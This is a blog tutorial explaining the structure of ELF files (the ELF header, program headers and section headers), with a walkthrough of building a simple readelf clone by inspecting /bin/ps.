      <content>&lt;p&gt;Hello folks, hope you are all doing well because today we are going to talk about ELF files, but don’t be scared. Even if this topic offers a huge amount of information, I will try to make it as simple and fun as I can. With that being said, let’s talk a bit about the structure of this article. It will be split into the following parts:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;General Information
The anatomy of an ELF file
  Missconsceptions
  Linking and executing
  ELF Header
  Program headers
  Section headers
Creating your own readelf
Conclusion
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;general-information&#34;&gt;General Information&lt;/h1&gt;
&lt;p&gt;So first of all, why would you want to bother learning about a specific file format that was adopted as a system default in UNIX almost 20 years ago?&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Well, this will help you understand better the inner workings of your operating system, thus giving you the answer to the known questions like why/what happened.&lt;/li&gt;
&lt;li&gt;You will be able to research ELF files, thus helping you in forensics.&lt;/li&gt;
&lt;li&gt;For a better understanding while developing.&lt;/li&gt;
&lt;li&gt;If you want to dive into reverse engineering and exploitation, this will come in handy.&lt;/li&gt;
&lt;li&gt;You will have another tool to play around with and maybe discover new creative ways to reap the benefit out of it.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;I hope that I got you excited, so let’s jump into it.&lt;/p&gt;
&lt;h2 id=&#34;how-a-process-is-created&#34;&gt;How a process is created&lt;/h2&gt;
&lt;p&gt;So whatever OS you are using, the idea is basically the same. In order to execute commands, the CPU, needs some specific language , also known as assembly/machine code. The OS is making this possible by translating common functions &lt;em&gt;( as simple as printing something to the screen )&lt;/em&gt; in assembly language. So, instead of talking directly to the CPU, we use a programming language, with internal functions. A compiler then translates these internal functions into object code.&lt;/p&gt;
&lt;p&gt;The object code is then linked &lt;em&gt;(with the help of a linker tool)&lt;/em&gt; into a full program. Thus, resulting a binary file, which can be executed on the specific platform and CPU type.&lt;/p&gt;
&lt;h1 id=&#34;the-anatomy-of-an-elf-file&#34;&gt;The anatomy of an ELF file&lt;/h1&gt;
&lt;p&gt;ELF stands for Executable and Linkable Format and it’s a common standard file format in UNIX systems. It is very flexible and extensible, for example it doesn’t exclude any particular CPU or ISA, allowing it to be adopted by many different hardware platforms and OS. A lot of people think that ELF files are just binaries and executables, but as discussed earlier we have already seen that it was used as an object file. Also, it can be used for shared libraries, core dumps and even for kernel modules !&lt;/p&gt;
&lt;p&gt;Ok, so let’s start with a general layout on how a typical ELF file is structured:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;   Linking View            Execution View

+-----------------+     +-----------------+
|  ELF header     |     |  ELF header     |
+-----------------+     +-----------------+
|  Program header |     |  Program header |
|  table (opt.)   |     |  table          |
+-----------------+     +-----------------+
|    Section 1    |     |                 |
+-----------------+     |    Segment 1    |
|       ...       |     |                 |
+-----------------+     +-----------------+
|    Section n    |     |                 |
+-----------------+     |    Segment 2    |
|       ...       |     |                 |
+-----------------+     +-----------------+
|       ...       |     |       ...       |
+-----------------+     +-----------------+
|  Section header |     |  Section header |
|  table          |     |  table (opt.)   |
+-----------------+     +-----------------+
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;As you can see, an ELF file has two different views and both of them have always 2 permanent headers:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;ELF header &lt;em&gt;(ELF32_Ehdr/ELF64_Ehdr)&lt;/em&gt; and the section header &lt;em&gt;(Elf32_Shdr/Elf64_Shdr)&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;ELF header &lt;em&gt;(ELF32_Ehdr/ELF64_Ehdr)&lt;/em&gt; and the program header &lt;em&gt;(Elf32_Phdr/Elf64_Phdr)&lt;/em&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The first one &lt;em&gt;(Linking View)&lt;/em&gt; is divided into sections and it’s used when linking of a library or program takes place. The sections contain data about object files like: instructions, debugging information, symbols or relocation information.&lt;/p&gt;
&lt;p&gt;The second one &lt;em&gt;(Execution view)&lt;/em&gt; is divided into segments and it’s used during program execution.
We will discuss more about them later. For now, let’s focus on the ELF header.&lt;/p&gt;
&lt;h2 id=&#34;the-elf-header&#34;&gt;The ELF Header&lt;/h2&gt;
&lt;p&gt;The header that is always present in both states it’s the ELF header and it’s defined as follows:&lt;/p&gt;

  &lt;img src=&#34;https://vlagh3.github.io/img/struct_ehdr.png&#34;  alt=&#34;Hello Friend&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;This structure is not very difficult to understand. It contains all the information for the binary within its very first bytes. Let’s quickly go through the first 6 attributes of the structure:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;E_indent : initial magic bytes that provide an answer for the OS on how to interpret and decode the files content.
E_type   : identifies the object file type (executable, shared object, relocatable, etc)
E_machine: specifies the required architecture
E_version: specifies the current version (usually that’s 1)
E_ehsize : specifies the ELF header’s size
E_entry  : specifies the virtual address at which the system transfers the control first, thus starting the process. You can think of it as the main function, even if it’s more complicated than that.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The next values all specify certain offsets, size, address values for the section header and program header values which I will come back later.
The program header&lt;/p&gt;
&lt;h2 id=&#34;the-program-header&#34;&gt;The program header&lt;/h2&gt;
&lt;p&gt;The program header describes segments within the binary that are necessary for program loading.
These segments contain one or more sections describing the memory layout, on the disk, of an executable and how it should be loaded into memory.
Since they are managing the creation of the process image, a program header becomes mandatory for executable files, but it’s optional for shared objects. That’s because a relocatable or shared object file(*.o) is meant to be linked into an executable, but not meant to be loaded into memory.&lt;/p&gt;
&lt;p&gt;The program header structure looks like this:&lt;/p&gt;

  &lt;img src=&#34;https://vlagh3.github.io/img/struct_phdr.png&#34;  alt=&#34;Hello Friend&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;pre&gt;&lt;code&gt;P_type   : This attribute is specifying the type of the segment (e.g dynamic linking tables)
P_offset : Gives the offset from the beginning of the file at which the first byte of the segment resides
P_vaddr  : Gives the virtual address at which the segment will be loaded into memory
P_paddr  : For systems which physical addressing is relevant, this member is reserved for the segment’s physical address.
P_filesz : Contains the size of the file image of the segment
P_memsz  : Contains the number of bytes in the memory image of the segment
P_flags  : This attribute gives flags relevant to the segment (e.g read, write, execute)
P_align  : Some alignment bytes with the power of 2
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Since a program has multiple program segments, the ELF gives us all the information about where and how many of them exist in the ELF header:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;E_phoff    &lt;/code&gt;: Offset to the start of the program header table&lt;/li&gt;
&lt;li&gt;&lt;code&gt;E_phentsize&lt;/code&gt;: Contains the size of a single program header table entry&lt;/li&gt;
&lt;li&gt;&lt;code&gt;E_phnum    &lt;/code&gt;: Contains the total number of entries in the program header table&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;common-program-headers&#34;&gt;Common program headers:&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;PT_LOAD&lt;/code&gt;: This is always present in an executable and there will be at least one of these. It’s describing a loadable segment which is mapped into memory.
Generally a basic dynamically linked ELF executable will have 2 of these segments:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;one for the text segment &lt;em&gt;(the actual program code)&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;another one for global vars, data segment and other dynamic linking information&lt;/li&gt;
&lt;li&gt;the memory alignment will be specified by the &lt;code&gt;p_align&lt;/code&gt; member&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;PT_NOTE&lt;/code&gt;: This type of segment it’s used by specific vendors/systems for marking an object file with special information that other programs will check for conformance, compatibility, etc.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;it can hold any amount of entries.&lt;/li&gt;
&lt;li&gt;each of the entries are an array of 4-byte words with the processor specific endianess in mind.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;PT_INTERP&lt;/code&gt; This program header element it’s useful for the system at execution time. The program retrieves the path name from it and creates the initial process image. Then is the interpreter’s responsibility to receive control from the system and provide an environment for the application program.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;from my local &lt;code&gt;/bin/ps&lt;/code&gt; we can find where the &lt;code&gt;PT_INTERP&lt;/code&gt; segment is located with the help of &lt;code&gt;readelf –l /bin/ps&lt;/code&gt;. After, we can use &lt;code&gt;hexdump&lt;/code&gt; with the offset retrieved earlier to see its content.

  &lt;img src=&#34;https://vlagh3.github.io/img/iterp.png&#34;  alt=&#34;Hello Friend&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;

&lt;/li&gt;
&lt;li&gt;as you can see, in the example above the linker used is the ld-linux-x86-64, since our executable is 64-bit.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;PT_PHDR&lt;/code&gt;: This one holds the location and size of the program header table itself.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;GNU_EH_FRAME&lt;/code&gt;: This is a sorted queue used by the GNU C compiler. It stores exception handlers. So, when something goes wrong, this area can be used to deal with it correctly.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;GNU_STACK&lt;/code&gt;: It’s used to store stack information. This is a somewhat important segment for exploit development, because if the stack is executable and you apply a little memory manipulation magic, it may bring to some really serious security problems. So, if the GNU_STACK segment is not available, then usually it’s used an executable stack.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;section-headers&#34;&gt;Section headers&lt;/h2&gt;
&lt;p&gt;As we have spoken earlier, the segments from the program header table are necessary for an executable to run. Each of those segments have sections that are needed during linking time. The sections can be found in the section header table &lt;em&gt;(this is basically an array of Elf32_Shdr/Elf64_Shdr structures)&lt;/em&gt; and each of these store information needed for the dynamic linker such as: symbols, global variables, etc. Also, they are referencing the size and location of them. They are not needed for correct program execution whereas program headers are.&lt;/p&gt;
&lt;p&gt;This is possible because they are not helping to load and map any memory layout into the binary. Thus, you can strip off the sections, but the executable will be much harder to reverse/debug.
Let’s see how the &lt;code&gt;Elf32_Shdr/Elf64_Shdr&lt;/code&gt; structure look:&lt;/p&gt;

  &lt;img src=&#34;https://vlagh3.github.io/img/struct_shdr.png&#34;  alt=&#34;Hello Friend&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;pre&gt;&lt;code&gt;Sh_name    : This member holds an offset to the name of the section. It’s value is an index into the .shstrtab (Section Header String Table).
Sh_type    : This member categorizes the sections’s content and semantics. (e.g  SHT_RELA=holds relocation entries,  SHT_SYMTAB=holds a symbol table)
Sh_flags   : Specifies a 1-bit flag such as: SHF_WRITE(writable), SHF_ALLOC(occupies memory during execution)
Sh_addr    : If the section will be in the memory image of the process, this member is holding the address where it will reside.
Sh_offset  : Is holding the offset from the beginning of the file to the section.
Sh_size    : Is holding the size of the section in bytes
Sh_link    : Points to another section
Sh_info    : This member holds extra information about the section.
Sh_entsize : Contains the size of each entry, for sections that contain fixed-sized entries.
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;common-sections&#34;&gt;Common sections&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;.text&lt;/code&gt;: Contains the program code, this is usually packed within a segment with read and execute permissions &lt;em&gt;(&lt;code&gt;PT_LOAD&lt;/code&gt;)&lt;/em&gt;. Also it will be loaded only once, since the content will not change.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.data&lt;/code&gt;: This section resides in the data segment and it contains initialized data that will contribute to the program’s memory image. (e.g initialized global variables)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.bss&lt;/code&gt;: Same as the .data section but with uninitialized data.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.dynsym&lt;/code&gt;: Holds the dynamic linking symbols table imported from shared libraries (e.g exit from libc) that are dynamically loaded at runtime.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.debug&lt;/code&gt;: Holds information for symbolic debugging&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.dynamic&lt;/code&gt;: Holds dynamic linking information&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.plt&lt;/code&gt;: Holds the procedure linkage table. This is used to call functions from used shared libraries.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.got.plt&lt;/code&gt;: This goes hand in hand with .plt section to dynamically resolve and guide the program to the correct address of the imported shared libraries functions.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.rodata&lt;/code&gt;: Contains read-only data such as strings from code that look like this perror(“Error occurred !”).&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.hash&lt;/code&gt;: This section holds a symbol hash table.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.symtab&lt;/code&gt;: The .symtab section contains all symbols from .dynsym as well as local symbols for the executable. This is mainly used for debugging.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.strtab&lt;/code&gt;: Contains the symbol string table that is references by an entry within &lt;code&gt;ElfN_Sym&lt;/code&gt; structs.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.shstrtab&lt;/code&gt;: Contains the section header string table that is used to resolve names for each section. More precise, in here are the string values for the &lt;code&gt;sh_name&lt;/code&gt; field from the section header struct. They can be accessed via an index/offset added on the &lt;code&gt;sh_offset&lt;/code&gt; of this section.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.ctors/.dtors&lt;/code&gt;: The .ctors &lt;em&gt;(constructors)&lt;/em&gt; and .dtors &lt;em&gt;(destructors)&lt;/em&gt; sections contain function pointers to initialization and finalization code that is to be executed before and after the actual &lt;code&gt;main()&lt;/code&gt; body of program code.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The ELF header provides the needed information to find the location and the number of sections (same as the program header)&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;  E_shoff     : Offset to the start of the section header table
  E_shnum     : Specifies how many section headers are in the section program header
  E_shentsize : Specifies the size of one section header.
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;NOTE&lt;/strong&gt;: You can calculate the total size of the program header/section header by multypling &lt;code&gt;E_shnum/E_phnum * E_shentsize/E_phentsize&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&#34;creating-your-own-readelf&#34;&gt;Creating your own readelf&lt;/h1&gt;
&lt;p&gt;Now, that we have covered all the information needed, you are probably thinking what can we do with that. The first thing that popped into my mind was to recreate the functionality of readelf. Basically, the tool is just inspecting the bytes from the ELF Header, Section Header and Program Header and it’s interpreting the data in a human readable form.
So, I started to build my own one that is doing exactly the same thing in order to understand even better all the structures and the format itself.&lt;/p&gt;
&lt;p&gt;Let’s start by interpreting the theory that we have learned and get a better visual representation of it.
I wanted to make things easy, so we will take a look at the &lt;code&gt;/bin/ps&lt;/code&gt; as our experimental rat. And it’s looking like that:

  &lt;img src=&#34;https://vlagh3.github.io/img/file_ps.png&#34;  alt=&#34;Hello Friend&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;

&lt;/p&gt;
&lt;p&gt;We are dealing with a 64-bit binary, so we need to keep in mind the appropriate data types and the overall size of each structure!
The ELF header is going to be 64 bytes long. With that knowledge, we can display the first 64 bytes with &lt;code&gt;hexdump&lt;/code&gt; and see the following:

  &lt;img src=&#34;https://vlagh3.github.io/img/elf_header.png&#34;  alt=&#34;Hello Friend&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;

&lt;/p&gt;
&lt;p&gt;If you go back and look at the &lt;code&gt;Elf64_Ehdr&lt;/code&gt; structure we can easily translate the bytes to the corresponding attributes:

  &lt;img src=&#34;https://vlagh3.github.io/img/script_elf_header.png&#34;  alt=&#34;Hello Friend&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;

&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;NOTE&lt;/strong&gt;: the &lt;code&gt;e_ident&lt;/code&gt; attribute is having a padding of  8 bytes that are unused. I will let you try to think of methods how to use this in your advantage. 😛&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;What I did here was just to make some dictionaries according to the &lt;a href=&#34;https://www.cs.cmu.edu/afs/cs/academic/class/15213-f00/docs/elf.pdf&#34;&gt;ELF paper&lt;/a&gt;. Then create an &lt;code&gt;elf_header&lt;/code&gt; class that has methods for every attribute to retrieve the information based on the file that I opened. We can do this same approach for the program headers and section headers within the binary. The only difference being that there are multiple of those.
So, if we go to the specified offset retrieved from the attribute &lt;code&gt;e_phoff&lt;/code&gt; from the elf header, we can go to the start of the program header table and match the bytes again based on the &lt;code&gt;Elf64_Phdr&lt;/code&gt; struct.

  &lt;img src=&#34;https://vlagh3.github.io/img/Program_header.png&#34;  alt=&#34;Hello Friend&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;

&lt;/p&gt;
&lt;p&gt;Last but not least, we do the same thing with the section header table.

  &lt;img src=&#34;https://vlagh3.github.io/img/section_header.png&#34;  alt=&#34;Hello Friend&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;

&lt;/p&gt;
&lt;p&gt;All of the code used for my own readelf ca be found &lt;a href=&#34;https://github.com/vlagh3/interelf&#34;&gt;@ my github&lt;/a&gt;. Also, if you want to go in depth on this topic, you can have a look at the contents in the &lt;a href=&#34;https://github.com/torvalds/linux/blob/master/include/uapi/linux/elf.h&#34;&gt;elf.h&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;&lt;strong&gt;What are the take aways from everything we have done here?&lt;/strong&gt;
Never be afraid of testing, playing around and messing up with things. That’s how you learn after all!
This is a simple example I gave you, but with this knowledge, you can come with really creative projects. I already have some ideas that we will discuss in the next articles.&lt;/p&gt;
&lt;p&gt;That’s it folks ! I hope you’ve learned something and developed a better understanding of the ELF format and the linux world.
By no means, I’m an expert in this field and the information I detailed in this article is pure self researching, so any productive criticism is always welcomed.
I’m really curious how you will use what you have learned, so let me know by commenting or contacting me. I’m always excited to talk on different subjects and maybe develop a new project we can work on.
Thanks for reading and I hope you’ve got a great time !&lt;/p&gt;
</content>
    </item>
    
  </channel>
</rss>
